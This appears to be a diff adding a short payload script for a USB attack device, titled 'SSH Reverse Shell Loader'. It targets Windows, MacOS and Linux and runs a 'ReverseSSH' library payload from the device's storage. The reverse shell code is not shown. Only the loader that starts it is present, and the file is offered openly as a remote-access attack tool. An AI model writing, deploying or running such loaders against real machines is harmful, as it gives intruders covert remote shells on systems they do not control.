@@ -1,0 +1,17 @@
+# Title: SSH Reverse Shell Loader
+# Author: Ludicro
+# Version: 1.0
+#
+# Loads and executes the ReverseSSH library payload
+#
+# Target: Windows, MacOS, Linux 
+# Category: Remote Access
+
+LED SETUP
+scriptFolder=" /root/udisk/payloads/library/RemoteAccess/ReverseSSH/ "
+script="run.txt"
+
+RUN_PAYLOAD $scriptFolder $script
+
+
+LED FINISH
